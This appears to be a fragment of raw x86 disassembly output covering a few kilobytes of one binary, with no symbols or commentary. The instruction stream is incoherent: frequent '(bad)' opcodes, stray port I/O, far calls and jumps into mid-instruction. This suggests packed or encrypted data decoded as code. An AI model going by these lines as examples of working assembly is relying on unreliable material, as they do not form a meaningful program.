  414713:	2d 05 0f 2d 87       	sub    $0x872d0f05,%eax
  414718:	ea fa 97 7e 89 3d 3d 	ljmp   $0x3d3d,$0x897e97fa
  41471f:	4e                   	dec    %esi
  414720:	eb 60                	jmp    0x414782
  414722:	05 71 d1 3f 83       	add    $0x833fd171,%eax
  414727:	e8 02 72 36 74       	call   0x7477b92e
  41472c:	b6 e7                	mov    $0xe7,%dh
  41472e:	bf 17 cb 52 3d       	mov    $0x3d52cb17,%edi
  414733:	96                   	xchg   %eax,%esi
  414734:	29 11                	sub    %edx,(%ecx)
  414736:	74 3d                	je     0x414775
  414738:	2d 93 2e 22 13       	sub    $0x13222e93,%eax
  41473d:	ff                   	lcall  (bad)
  41473e:	df be df 02 24 eb    	fistpll -0x14dbfd21(%esi)
  414744:	3a 2d fd 0e 2f 27    	cmp    0x272f0efd,%ch
  41474a:	3d 74 26 eb 2c       	cmp    $0x2ceb2674,%eax
  41474f:	b0 c8                	mov    $0xc8,%al
  414751:	eb 2a                	jmp    0x41477d
  414753:	b0 c9                	mov    $0xc9,%al
  414755:	eb 6f                	jmp    0x4147c6
  414757:	d1 bd f1 26 b0 cd    	sarl   $1,-0x324fd90f(%ebp)
  41475d:	eb f5                	jmp    0x414754
  41475f:	cf                   	iret
  414760:	eb 1e                	jmp    0x414780
  414762:	0f 1a 6f eb          	bndldx -0x15(%edi),(bad)
  414766:	16                   	push   %ss
  414767:	b0 42                	mov    $0x42,%al
  414769:	37                   	aaa
  41476a:	60                   	pusha
  41476b:	a3 ce 0d b0 ed       	mov    %eax,0xedb00dce
  414770:	b0 da                	mov    $0xda,%al
  414772:	c2 83 12             	ret    $0x1283
  414775:	5d                   	pop    %ebp
  414776:	e2 b0                	loop   0x414728
  414778:	d9 0f                	(bad) (%edi)
  41477a:	b0 ca                	mov    $0xca,%al
  41477c:	ce                   	into
  41477d:	b9 3c 3a c1 6f       	mov    $0x6fc13a3c,%ecx
  414782:	ff c8                	dec    %eax
  414784:	52                   	push   %edx
  414785:	0c fc                	or     $0xfc,%al
  414787:	71 38                	jno    0x4147c1
  414789:	0c 37                	or     $0x37,%al
  41478b:	61                   	popa
  41478c:	9f                   	lahf
  41478d:	89 05 1a 0f c6 7b    	mov    %eax,0x7bc60f1a
  414793:	18 07                	sbb    %al,(%edi)
  414795:	ab                   	stos   %eax,%es:(%edi)
  414796:	17                   	pop    %ss
  414797:	74 71                	je     0x41480a
  414799:	28 ad 71 c9 a7 63    	sub    %ch,0x63a7c971(%ebp)
  41479f:	0d 08 4a 36 5c       	or     $0x5c364a08,%eax
  4147a4:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4147a5:	4a                   	dec    %edx
  4147a6:	8d                   	lea    (bad),%edx
  4147a7:	d1 a4 3b d8 53 17 a9 	shll   $1,-0x56e8ac28(%ebx,%edi,1)
  4147ae:	0d b8 8c 02 5e       	or     $0x5e028cb8,%eax
  4147b3:	d2 fa                	sar    %cl,%dl
  4147b5:	e4 6b                	in     $0x6b,%al
  4147b7:	ee                   	out    %al,(%dx)
  4147b8:	8c 02                	mov    %es,(%edx)
  4147ba:	32 d4                	xor    %ah,%dl
  4147bc:	ee                   	out    %al,(%dx)
  4147bd:	0b 21                	or     (%ecx),%esp
  4147bf:	7d 30                	jge    0x4147f1
  4147c1:	44                   	inc    %esp
  4147c2:	2a fc                	sub    %ah,%bh
  4147c4:	23 40 8b             	and    -0x75(%eax),%eax
  4147c7:	0d d9 a3 2b 01       	or     $0x12ba3d9,%eax
  4147cc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4147cd:	f8                   	clc
  4147ce:	fd                   	std
  4147cf:	e4 b8                	in     $0xb8,%al
  4147d1:	d9 9a 51 14 d1 68    	fstps  0x68d11451(%edx)
  4147d7:	e0 8a                	loopne 0x414763
  4147d9:	f5                   	cmc
  4147da:	80 31 d7             	xorb   $0xd7,(%ecx)
  4147dd:	9d                   	popf
  4147de:	f5                   	cmc
  4147df:	ae                   	scas   %es:(%edi),%al
  4147e0:	a1 60 58 a1 0a       	mov    0xaa15860,%eax
  4147e5:	52                   	push   %edx
  4147e6:	6e                   	outsb  %ds:(%esi),(%dx)
  4147e7:	e4 04                	in     $0x4,%al
  4147e9:	74 c6                	je     0x4147b1
  4147eb:	0c 75                	or     $0x75,%al
  4147ed:	89 89 30 a3 28 82    	mov    %ecx,-0x7dd75cd0(%ecx)
  4147f3:	1f                   	pop    %ds
  4147f4:	a1 b7 70 d7 f5       	mov    0xf5d770b7,%eax
  4147f9:	0a 99 1c 25 39 c8    	or     -0x37c6dae4(%ecx),%bl
  4147ff:	75 6b                	jne    0x41486c
  414801:	00 2b                	add    %ch,(%ebx)
  414803:	5f                   	pop    %edi
  414804:	a0 c5 05 79 09       	mov    0x97905c5,%al
  414809:	83 db 2e             	sbb    $0x2e,%ebx
  41480c:	39 01                	cmp    %eax,(%ecx)
  41480e:	75 f5                	jne    0x414805
  414810:	3b 4c b4 55          	cmp    0x55(%esp,%esi,4),%ecx
  414814:	8a 01                	mov    (%ecx),%al
  414816:	9f                   	lahf
  414817:	43                   	inc    %ebx
  414818:	bf 24 a5 46 f7       	mov    $0xf746a524,%edi
  41481d:	50                   	push   %eax
  41481e:	3e 08 2e             	or     %ch,%ds:(%esi)
  414821:	48                   	dec    %eax
  414822:	a9 5b 02 47 76       	test   $0x7647025b,%eax
  414827:	c4 70 04             	les    0x4(%eax),%esi
  41482a:	80 32 37             	xorb   $0x37,(%edx)
  41482d:	89 22                	mov    %esp,(%edx)
  41482f:	cb                   	lret
  414830:	6e                   	outsb  %ds:(%esi),(%dx)
  414831:	9b                   	fwait
  414832:	bb fb 7e 12 4b       	mov    $0x4b127efb,%ebx
  414837:	89 18                	mov    %ebx,(%eax)
  414839:	44                   	inc    %esp
  41483a:	de 04 23             	fiadds (%ebx,%eiz,1)
  41483d:	99                   	cltd
  41483e:	d0 11                	rclb   $1,(%ecx)
  414840:	7f ee                	jg     0x414830
  414842:	ae                   	scas   %es:(%edi),%al
  414843:	08 3c 24             	or     %bh,(%esp)
  414846:	5d                   	pop    %ebp
  414847:	eb 14                	jmp    0x41485d
  414849:	0c f8                	or     $0xf8,%al
  41484b:	3c 64                	cmp    $0x64,%al
  41484d:	a0 c8 26 e8 5a       	mov    0x5ae826c8,%al
  414852:	1e                   	push   %ds
  414853:	5d                   	pop    %ebp
  414854:	11 9f fd 4e db 5f    	adc    %ebx,0x5fdb4efd(%edi)
  41485a:	a1 2c 8b 4b 8b       	mov    0x8b4b8b2c,%eax
  41485f:	30 0b                	xor    %cl,(%ebx)
  414861:	4f                   	dec    %edi
  414862:	32 b6 02 78 5d 92    	xor    -0x6da287fe(%esi),%dh
  414868:	3b f3                	cmp    %ebx,%esi
  41486a:	7e 1c                	jle    0x414888
  41486c:	04 00                	add    $0x0,%al
  41486e:	79 37                	jns    0x4148a7
  414870:	fb                   	sti
  414871:	df 43 89             	filds  -0x77(%ebx)
  414874:	1d 30 26 5f 3b       	sbb    $0x3b5f2630,%eax
  414879:	f3 7f ec             	repz jg 0x414868
  41487c:	ad                   	lods   %ds:(%esi),%eax
  41487d:	44                   	inc    %esp
  41487e:	7c 3d                	jl     0x4148bd
  414880:	c7 05 52 a8 44 09 2f 	movl   $0x9a6c562f,0x944a852
  414887:	56 6c 9a 
  41488a:	14 b8                	adc    $0xb8,%al
  41488c:	a3 2c 38 4d fe       	mov    %eax,0xfe4d382c
  414891:	b9 4b ef 89 15       	mov    $0x1589ef4b,%ecx
  414896:	34 da                	xor    $0xda,%al
  414898:	2d a3 20 1d 42       	sub    $0x421d20a3,%eax
  41489d:	a0 c6 05 28 34       	mov    0x342805c6,%al
  4148a2:	7c e2                	jl     0x414886
  4148a4:	e7 0a                	out    %eax,$0xa
  4148a6:	0b 27                	or     (%edi),%esp
  4148a8:	48                   	dec    %eax
  4148a9:	23 be 80 d8 b1 8f    	and    -0x704e2780(%esi),%edi
  4148af:	3e b1 14             	ds mov $0x14,%cl
  4148b2:	7a 00                	jp     0x4148b4
  4148b4:	f8                   	clc
  4148b5:	c3                   	ret
  4148b6:	bf 21 db 46 bb       	mov    $0xbb46db21,%edi
  4148bb:	fa                   	cli
  4148bc:	99                   	cltd
  4148bd:	f7 ff                	idiv   %edi
  4148bf:	80 c2 a4             	add    $0xa4,%dl
  4148c2:	8a c1                	mov    %cl,%al
  4148c4:	22 06                	and    (%esi),%al
  4148c6:	13 bb 6f c4 02 27    	adc    0x2702c46f(%ebx),%edi
  4148cc:	fb                   	sti
  4148cd:	c4 49 ef             	les    -0x11(%ecx),%ecx
  4148d0:	db b1 1c 42 5b e5    	(bad) -0x1aa4bde4(%ecx)
  4148d6:	88 a1 71 cb e2 38    	mov    %ah,0x38e2cb71(%ecx)
  4148dc:	83 df 6e             	sbb    $0x6e,%edi
  4148df:	ee                   	out    %al,(%dx)
  4148e0:	92                   	xchg   %eax,%edx
  4148e1:	a0 0a d5 8a d9       	mov    0xd98ad50a,%al
  4148e6:	29 1e                	sub    %ebx,(%esi)
  4148e8:	c1 e8 04             	shr    $0x4,%eax
  4148eb:	49                   	dec    %ecx
  4148ec:	86 f4                	xchg   %dh,%ah
  4148ee:	2e 4c                	cs dec %esp
  4148f0:	a2 e6 27 a9 87       	mov    %al,0x87a927e6
  4148f5:	05 53 df 3a a1       	add    $0xa13adf53,%eax
  4148fa:	2d 25 19 70 62       	sub    $0x62701925,%eax
  4148ff:	5f                   	pop    %edi
  414900:	de 6f 14             	fisubrs 0x14(%edi)
  414903:	ff 77 da             	push   -0x26(%edi)
  414906:	76 d0                	jbe    0x4148d8
  414908:	b7 1c                	mov    $0x1c,%bh
  41490a:	02 20                	add    (%eax),%ah
  41490c:	8b 37                	mov    (%edi),%esi
  41490e:	b9 3c f3 a5 2c       	mov    $0x2ca5f33c,%ecx
  414913:	c9                   	leave
  414914:	06                   	push   %es
  414915:	cf                   	iret
  414916:	05 4e 13 51 e8       	add    $0xe851134e,%eax
  41491b:	38 c0                	cmp    %al,%al
  41491d:	57                   	push   %edi
  41491e:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  41491f:	bd be ab f6 3d       	mov    $0x3df6abbe,%ebp
  414924:	0c c2                	or     $0xc2,%al
  414926:	09 d8                	or     %ebx,%eax
  414928:	14 83                	adc    $0x83,%al
  41492a:	3d 14 c2 d6 81       	cmp    $0x81d6c214,%eax
  41492f:	db 70 4b             	(bad) 0x4b(%eax)
  414932:	79 08                	jns    0x41493c
  414934:	07                   	pop    %es
  414935:	56                   	push   %esi
  414936:	24 05                	and    $0x5,%al
  414938:	10 a4 de 67 30 6a 1e 	adc    %ah,0x1e6a3067(%esi,%ebx,8)
  41493f:	68 ba 59 90 fc       	push   $0xfc9059ba
  414944:	b0 58                	mov    $0x58,%al
  414946:	37                   	aaa
  414947:	1a 02                	sbb    (%edx),%al
  414949:	68 00 39 f0 8a       	push   $0x8af03900
  41494e:	5b                   	pop    %ebx
  41494f:	81 94 5f 20 b0 71 95 	adcl   $0x8f35ccef,-0x6a8e4fe0(%edi,%ebx,2)
  414956:	ef cc 35 8f 
  41495a:	78 09                	js     0x414965
  41495c:	3e 00 1d ec be dc 53 	add    %bl,%ds:0x53dcbeec
  414963:	ae                   	scas   %es:(%edi),%al
  414964:	5c                   	pop    %esp
  414965:	00 fe                	add    %bh,%dh
  414967:	0d ed 58 bb de       	or     $0xdebb58ed,%eax
  41496c:	be fa fb b2 be       	mov    $0xbeb2fbfa,%esi
  414971:	c1 bf 34 c0 37 28 3a 	sarl   $0x3a,0x2837c034(%edi)
  414978:	16                   	push   %ss
  414979:	83 3f df             	cmpl   $0xffffffdf,(%edi)
  41497c:	82 8d da 9f 11 96 d0 	orb    $0xd0,-0x69ee6026(%ebp)
  414983:	94                   	xchg   %eax,%esp
  414984:	17                   	pop    %ss
  414985:	8b e8                	mov    %eax,%ebp
  414987:	ff 06                	incl   (%esi)
  414989:	77 68                	ja     0x4149f3
  41498b:	bb d5 10 75 ef       	mov    $0xef7510d5,%ebx
  414990:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  414991:	10 19                	adc    %bl,(%ecx)
  414993:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  414994:	55                   	push   %ebp
  414995:	f7 0c 9f 27 28 74 80 	testl  $0x80742827,(%edi,%ebx,4)
  41499c:	13 35 02 70 88 26    	adc    0x26887002,%esi
  4149a2:	a2 c7 77 05 2f       	mov    %al,0x2f0577c7
  4149a7:	46                   	inc    %esi
  4149a8:	b0 80                	mov    $0x80,%al
  4149aa:	8b c5                	mov    %ebp,%eax
  4149ac:	14 6d                	adc    $0x6d,%al
  4149ae:	05 e6 61 a1 6b       	add    $0x6ba161e6,%eax
  4149b3:	38 43 10             	cmp    %al,0x10(%ebx)
  4149b6:	f1                   	int1
  4149b7:	1a 16                	sbb    (%esi),%dl
  4149b9:	32 1b                	xor    (%ebx),%bl
  4149bb:	53                   	push   %ebx
  4149bc:	85 ac 6b 51 78 42 10 	test   %ebp,0x10427851(%ebx,%ebp,2)
  4149c3:	3b ac 06 13 06 b6 3d 	cmp    0x3db60613(%esi,%eax,1),%ebp
  4149ca:	57                   	push   %edi
  4149cb:	9f                   	lahf
  4149cc:	6f                   	outsl  %ds:(%esi),(%dx)
  4149cd:	f4                   	hlt
  4149ce:	30 c0                	xor    %al,%al
  4149d0:	75 03                	jne    0x4149d5
  4149d2:	dc 84 88 65 fb 58 de 	faddl  -0x21a7049b(%eax,%ecx,4)
  4149d9:	28 44 83 3b          	sub    %al,0x3b(%ebx,%eax,4)
  4149dd:	78 17                	js     0x4149f6
  4149df:	18 97 98 7d 41 a7    	sbb    %dl,-0x58be8268(%edi)
  4149e5:	08 8b 34 64 03 56    	or     %cl,0x56036434(%ebx)
  4149eb:	4f                   	dec    %edi
  4149ec:	83 b0 11 3e fb 61 5e 	xorl   $0x5e,0x61fb3e11(%eax)
  4149f3:	38 49 c4             	cmp    %cl,-0x3c(%ecx)
  4149f6:	ac                   	lods   %ds:(%esi),%al
  4149f7:	f8                   	clc
  4149f8:	11 61 a3             	adc    %esp,-0x5d(%ecx)
  4149fb:	00 2a                	add    %ch,(%edx)
  4149fd:	3a 5d 51             	cmp    0x51(%ebp),%bl
  414a00:	c8 57 45 37          	enter  $0x4557,$0x37
  414a04:	e9 ff 58 77 d1       	jmp    0xd1b8a308
  414a09:	eb c7                	jmp    0x4149d2
  414a0b:	1c c7                	sbb    $0xc7,%al
  414a0d:	00 d0                	add    %dl,%al
  414a0f:	4a                   	dec    %edx
  414a10:	f8                   	clc
  414a11:	49                   	dec    %ecx
  414a12:	7c 10                	jl     0x414a24
  414a14:	f0 ff 11             	lock call *(%ecx)
  414a17:	ba 41 6b 06 b8       	mov    $0xb8066b41,%edx
  414a1c:	08 42 f8             	or     %al,-0x8(%edx)
  414a1f:	93                   	xchg   %eax,%ebx
  414a20:	6e                   	outsb  %ds:(%esi),(%dx)
  414a21:	8b 58 94             	mov    -0x6c(%eax),%ebx
  414a24:	58                   	pop    %eax
  414a25:	f7 d1                	not    %ecx
  414a27:	13 29                	adc    (%ecx),%ebp
  414a29:	0d 1b 99 e4 1a       	or     $0x1ae4991b,%eax
  414a2e:	c7 03 0e 08 28 bb    	movl   $0xbb28080e,(%ebx)
  414a34:	ee                   	out    %al,(%dx)
  414a35:	d5 0d                	aad    $0xd
  414a37:	3d 4e 75 da 1b       	cmp    $0x1bda754e,%eax
  414a3c:	27                   	daa
  414a3d:	24 21                	and    $0x21,%al
  414a3f:	41                   	inc    %ecx
  414a40:	7f 6d                	jg     0x414aaf
  414a42:	f0 ab                	lock stos %eax,%es:(%edi)
  414a44:	89 1a                	mov    %ebx,(%edx)
  414a46:	e8 42 24 2a b4       	call   0xb46b6e8d
  414a4b:	73 58                	jae    0x414aa5
  414a4d:	a9 06 27 b8 0b       	test   $0xbb82706,%eax
  414a52:	48                   	dec    %eax
  414a53:	fc                   	cld
  414a54:	9b                   	fwait
  414a55:	53                   	push   %ebx
  414a56:	b9 03 ec db 5a       	mov    $0x5adbec03,%ecx
  414a5b:	3b 36                	cmp    (%esi),%esi
  414a5d:	87 7b 14             	xchg   %edi,0x14(%ebx)
  414a60:	4b                   	dec    %ebx
  414a61:	74 94                	je     0x4149f7
  414a63:	3d 63 43 0a 7e       	cmp    $0x7e0a4363,%eax
  414a68:	29 8d a3 17 1a fd    	sub    %ecx,-0x2e5e85d(%ebp)
  414a6e:	39 7e 24             	cmp    %edi,0x24(%esi)
  414a71:	50                   	push   %eax
  414a72:	38 6c e0 fe          	cmp    %ch,-0x2(%eax,%eiz,8)
  414a76:	50                   	push   %eax
  414a77:	65 bf 95 88 1f 5a    	gs mov $0x5a1f8895,%edi
  414a7d:	66 c7 44 02 4d 13 08 	movw   $0x813,0x4d(%edx,%eax,1)
  414a84:	5a                   	pop    %edx
  414a85:	89 50 fc             	mov    %edx,-0x4(%eax)
  414a88:	81 2b 02 5b 26 f8    	subl   $0xf8265b02,(%ebx)
  414a8e:	c6 41 67 0b          	movb   $0xb,0x67(%ecx)
  414a92:	f0 4c                	lock dec %esp
  414a94:	0f cc                	bswap  %esp
  414a96:	17                   	pop    %ss
  414a97:	f8                   	clc
  414a98:	97                   	xchg   %eax,%edi
  414a99:	f9                   	stc
  414a9a:	56                   	push   %esi
  414a9b:	ec                   	in     (%dx),%al
  414a9c:	d6                   	salc
  414a9d:	d0 89 c7 f1 09 9f    	rorb   $1,-0x60f60e39(%ecx)
  414aa3:	89 f0                	mov    %esi,%eax
  414aa5:	9c                   	pushf
  414aa6:	9a 46 67 7c 8a 7b 89 	lcall  $0x897b,$0x8a7c6746
  414aad:	3b cb                	cmp    %ebx,%ecx
  414aaf:	52                   	push   %edx
  414ab0:	30 46 ed             	xor    %al,-0x13(%esi)
  414ab3:	29 de                	sub    %ebx,%esi
  414ab5:	b9 3c 70 5a 3f       	mov    $0x3f5a703c,%ecx
  414aba:	dc 2b                	fsubrl (%ebx)
  414abc:	bc c5 bb 89 21       	mov    $0x2189bbc5,%esp
  414ac1:	52                   	push   %edx
  414ac2:	3a 0a                	cmp    (%edx),%cl
  414ac4:	95                   	xchg   %eax,%ebp
  414ac5:	3a 4a 01             	cmp    0x1(%edx),%cl
  414ac8:	f7 04 5e 60 61 79 02 	testl  $0x2796160,(%esi,%ebx,2)
  414acf:	74 0b                	je     0x414adc
  414ad1:	03 9b 83 3d eb e8    	add    -0x1714c27d(%ebx),%ebx
  414ad7:	42                   	inc    %edx
  414ad8:	36 f5                	ss cmc
  414ada:	de df                	(bad)
  414adc:	00 89 d1 5a 29 d1    	add    %cl,-0x2ed6a52f(%ecx)
  414ae2:	e9 2e 9b 0c 0a       	jmp    0xa4de615
  414ae7:	42                   	inc    %edx
  414ae8:	5b                   	pop    %ebx
  414ae9:	a3 12 cf 0d 90       	mov    %eax,0x900dcf12
  414aee:	57                   	push   %edi
  414aef:	94                   	xchg   %eax,%esp
  414af0:	95                   	xchg   %eax,%ebp
  414af1:	84 f2                	test   %dh,%dl
  414af3:	cc                   	int3
  414af4:	5e                   	pop    %esi
  414af5:	a8 ab                	test   $0xab,%al
  414af7:	ae                   	scas   %es:(%edi),%al
  414af8:	40                   	inc    %eax
  414af9:	d1 e5                	shl    $1,%ebp
  414afb:	c1 58 5f 18          	rcrl   $0x18,0x5f(%eax)
  414aff:	75 8d                	jne    0x414a8e
  414b01:	0a 35 f3 03 4d b7    	or     0xb74d03f3,%dh
  414b07:	59                   	pop    %ecx
  414b08:	3f                   	aas
  414b09:	60                   	pusha
  414b0a:	66 01 07             	add    %ax,(%edi)
  414b0d:	23 17                	and    (%edi),%edx
  414b0f:	ba a9 b4 12 6f       	mov    $0x6f12b4a9,%edx
  414b14:	f4                   	hlt
  414b15:	8b 79 fc             	mov    -0x4(%ecx),%edi
  414b18:	6f                   	outsl  %ds:(%esi),(%dx)
  414b19:	fc                   	cld
  414b1a:	01 fa                	add    %edi,%edx
  414b1c:	f2 71 ac             	bnd jno 0x414acb
  414b1f:	6d                   	insl   (%dx),%es:(%edi)
  414b20:	b7 57                	mov    $0x57,%bh
  414b22:	91                   	xchg   %eax,%ecx
  414b23:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  414b24:	8b 4e 12             	mov    0x12(%esi),%ecx
  414b27:	13 11                	adc    (%ecx),%edx
  414b29:	ae                   	scas   %es:(%edi),%al
  414b2a:	5a                   	pop    %edx
  414b2b:	1b 2b                	sbb    (%ebx),%ebp
  414b2d:	5e                   	pop    %esi
  414b2e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  414b2f:	a8 03                	test   $0x3,%al
  414b31:	ca 7f ba             	lret   $0xba7f
  414b34:	c1 e6 fb             	shl    $0xfb,%esi
  414b37:	43                   	inc    %ebx
  414b38:	61                   	popa
  414b39:	41                   	inc    %ecx
  414b3a:	78 3b                	js     0x414b77
  414b3c:	10 4e 3b             	adc    %cl,0x3b(%esi)
  414b3f:	08 76 85             	or     %dh,-0x7b(%esi)
  414b42:	af                   	scas   %es:(%edi),%eax
  414b43:	15 a2 76 bd 44       	adc    $0x44bd76a2,%eax
  414b48:	76 6e                	jbe    0x414bb8
  414b4a:	2b 7c 41 78          	sub    0x78(%ecx,%eax,2),%edi
  414b4e:	0b fe                	or     %esi,%edi
  414b50:	57                   	push   %edi
  414b51:	d3 89 ce e5 fc 03    	rorl   %cl,0x3fce5ce(%ecx)
  414b57:	46                   	inc    %esi
  414b58:	9c                   	pushf
  414b59:	ec                   	in     (%dx),%al
  414b5a:	09 0b                	or     %ecx,(%ebx)
  414b5c:	b9 c7 fe a7 4b       	mov    $0x4ba7fec7,%ecx
  414b61:	9e                   	sahf
  414b62:	89 fa                	mov    %edi,%edx
  414b64:	62 86 a3 76 76 03    	bound  %eax,0x37676a3(%esi)
  414b6a:	53                   	push   %ebx
  414b6b:	0e                   	push   %cs
  414b6c:	58                   	pop    %eax
  414b6d:	0f ab 83 91 df 5f ec 	bts    %eax,-0x13a0206f(%ebx)
  414b74:	4f                   	dec    %edi
  414b75:	f8                   	clc
  414b76:	45                   	inc    %ebp
  414b77:	70 89                	jo     0x414b02
  414b79:	ca e9 50             	lret   $0x50e9
  414b7c:	89 ca                	mov    %ecx,%edx
  414b7e:	bc c0 f6 01 6b       	mov    $0x6b01f6c0,%esp
  414b83:	50                   	push   %eax
  414b84:	53                   	push   %ebx
  414b85:	31 ca                	xor    %ecx,%edx
  414b87:	4c                   	dec    %esp
  414b88:	94                   	xchg   %eax,%esp
  414b89:	14 12                	adc    $0x12,%al
  414b8b:	85 c2                	test   %eax,%edx
  414b8d:	0d c0 0c 39 08       	or     $0x8390cc0,%eax
  414b92:	a0 61 ce db c1       	mov    0xc1dbce61,%al
  414b97:	1a f1                	sbb    %cl,%dh
  414b99:	fc                   	cld
  414b9a:	4a                   	dec    %edx
  414b9b:	eb c9                	jmp    0x414b66
  414b9d:	15 09 03 0f 39       	adc    $0x390f0309,%eax
  414ba2:	82 d6 bd             	adc    $0xbd,%dh
  414ba5:	b5 cf                	mov    $0xcf,%ch
  414ba7:	fa                   	cli
  414ba8:	26 4a                	es dec %edx
  414baa:	75 ec                	jne    0x414b98
  414bac:	51                   	push   %ecx
  414bad:	17                   	pop    %ss
  414bae:	73 fe                	jae    0x414bae
  414bb0:	12 67 bb             	adc    -0x45(%edi),%ah
  414bb3:	c4 77 fc             	les    -0x4(%edi),%esi
  414bb6:	be 3c 35 37 03       	mov    $0x337353c,%esi
  414bbb:	37                   	aaa
  414bbc:	4b                   	dec    %ebx
  414bbd:	eb 08                	jmp    0x414bc7
  414bbf:	87 f8                	xchg   %edi,%eax
  414bc1:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  414bc2:	c6                   	(bad)
  414bc3:	91                   	xchg   %eax,%ecx
  414bc4:	50                   	push   %eax
  414bc5:	67 44                	addr16 inc %esp
  414bc7:	9c                   	pushf
  414bc8:	18 89 f2 5b 68 a5    	sbb    %cl,-0x5a97a40e(%ecx)
  414bce:	c6                   	(bad)
  414bcf:	b6 48                	mov    $0x48,%dh
  414bd1:	ff ce                	dec    %esi
  414bd3:	8b 4b 67             	mov    0x67(%ebx),%ecx
  414bd6:	c5 9d 6c 6e 8b a3    	lds    -0x5c749194(%ebp),%ebx
  414bdc:	0c e6                	or     $0xe6,%al
  414bde:	91                   	xchg   %eax,%ecx
  414bdf:	4a                   	dec    %edx
  414be0:	5a                   	pop    %edx
  414be1:	1e                   	push   %ds
  414be2:	14 a9                	adc    $0xa9,%al
  414be4:	df 92 58 8d 24 94    	fists  -0x6bdb72a8(%edx)
  414bea:	ff e0                	jmp    *%eax
  414bec:	a3 74 1a 0c 0b       	mov    %eax,0xb0c1a74
  414bf1:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  414bf2:	1a 02                	sbb    (%edx),%al
  414bf4:	8f                   	(bad)
  414bf5:	b6 da                	mov    $0xda,%dh
  414bf7:	68 25 f8 bf ed       	push   $0xedbff825
  414bfc:	6b 6b 8b e9          	imul   $0xffffffe9,-0x75(%ebx),%ebp
  414c00:	8b 57 fc             	mov    -0x4(%edi),%edx
  414c03:	29 d0                	sub    %edx,%eax
  414c05:	77 02                	ja     0x414c09
  414c07:	01 c2                	add    %eax,%edx
  414c09:	52                   	push   %edx
  414c0a:	f4                   	hlt
  414c0b:	ed                   	in     (%dx),%eax
  414c0c:	bf c1 12 29 8b       	mov    $0x8b2912c1,%edi
  414c11:	9a 1f 39 d9 75 58 4a 	lcall  $0x4a58,$0x75d9391f
  414c18:	74 15                	je     0x414c2f
  414c1a:	ec                   	in     (%dx),%al
  414c1b:	bb c5 9d 8b 04       	mov    $0x48b9dc5,%ebx
  414c20:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  414c21:	0c 4b                	or     $0x4b,%al
  414c23:	83 c6 52             	add    $0x52,%esi
  414c26:	c7                   	(bad)
  414c27:	08 9f ad cb 56 62    	or     %bl,0x6256cbad(%edi)
  414c2d:	e2 1f                	loop   0x414c4e
  414c2f:	0a 04 04             	or     (%esp,%eax,1),%al
  414c32:	5a                   	pop    %edx
  414c33:	e9 fd b2 7c 0b       	jmp    0xbbdff35
  414c38:	da 22                	fisubl (%edx)
  414c3a:	2b 38                	sub    (%eax),%edi
  414c3c:	41                   	inc    %ecx
  414c3d:	17                   	pop    %ss
  414c3e:	38 fd                	cmp    %bh,%ch
  414c40:	75 3a                	jne    0x414c7c
  414c42:	5d                   	pop    %ebp
  414c43:	80 02 b1             	addb   $0xb1,(%edx)
  414c46:	06                   	push   %es
  414c47:	10 45 d6             	adc    %al,-0x2a(%ebp)
  414c4a:	81 e1 3b 76 a9 ee    	and    $0xeea9763b,%ecx
  414c50:	05 38 27 b2 eb       	add    $0xebb22738,%eax
  414c55:	23 60 eb             	and    -0x15(%eax),%esp
  414c58:	1c 6a                	sbb    $0x6a,%al
  414c5a:	b7 ea                	mov    $0xea,%bh
  414c5c:	ba 9d 06 15 5a       	mov    $0x5a15069d,%edx
  414c61:	30 10                	xor    %dl,(%eax)
  414c63:	2d 0c 7f 10 c1       	sub    $0xc1107f0c,%eax
  414c68:	8f                   	(bad)
  414c69:	cd 28                	int    $0x28
  414c6b:	dd eb                	fucomp %st(3)
  414c6d:	10 0d 02 53 d3 50    	adc    %cl,0x50d35302
  414c73:	f8                   	clc
  414c74:	42                   	inc    %edx
  414c75:	d6                   	salc
  414c76:	58                   	pop    %eax
  414c77:	35 1e db 9a bb       	xor    $0xbb9adb1e,%eax
  414c7c:	02 85 7e 3e 0c f0    	add    -0xff3c182(%ebp),%al
  414c82:	b8 7d 3d 45 e9       	mov    $0xe9453d7d,%eax
  414c87:	38 74 32 53          	cmp    %dh,0x53(%edx,%esi,1)
  414c8b:	d2 86 25 15 ff 3e    	rolb   %cl,0x3eff1525(%esi)
  414c91:	df 13                	fists  (%ebx)
  414c93:	50                   	push   %eax
  414c94:	41                   	inc    %ecx
  414c95:	e4 39                	in     $0x39,%al
  414c97:	a9 1d 58 08 0a       	test   $0xa08581d,%eax
  414c9c:	48                   	dec    %eax
  414c9d:	40                   	inc    %eax
  414c9e:	0d 8f d6 c6 13       	or     $0x13c6d68f,%eax
  414ca3:	5b                   	pop    %ebx
  414ca4:	9d                   	popf
  414ca5:	73 95                	jae    0x414c3c
  414ca7:	2d 57 ef a2 57       	sub    $0x57a2ef57,%eax
  414cac:	07                   	pop    %es
  414cad:	8f                   	(bad)
  414cae:	2d 8b 58 fc 91       	sub    $0x91fc588b,%eax
  414cb3:	8b 76 e1             	mov    -0x1f(%esi),%esi
  414cb6:	7f 26                	jg     0x414cde
  414cb8:	4a                   	dec    %edx
  414cb9:	7c 1b                	jl     0x414cd6
  414cbb:	39 da                	cmp    %ebx,%edx
  414cbd:	7d 1f                	jge    0x414cde
  414cbf:	29 d3                	sub    %edx,%ebx
  414cc1:	89 7c 19 b1          	mov    %edi,-0x4f(%ecx,%ebx,1)
  414cc5:	46                   	inc    %esi
  414cc6:	62 0c fa             	bound  %ecx,(%edx,%edi,8)
  414cc9:	68 01 04 08 47       	push   $0x47080401
  414cce:	11 1d b3 2d 5e 35    	adc    %ebx,0x355e2db3
  414cd4:	eb e5                	jmp    0x414cbb
  414cd6:	89 14 eb             	mov    %edx,(%ebx,%ebp,8)
  414cd9:	12 fe                	adc    %dh,%bh
  414cdb:	5b                   	pop    %ebx
  414cdc:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  414cdd:	48                   	dec    %eax
  414cde:	52                   	push   %edx
  414cdf:	17                   	pop    %ss
  414ce0:	0a c3                	or     %bl,%al
  414ce2:	2b 5a b8             	sub    -0x48(%edx),%ebx
  414ce5:	f1                   	int1
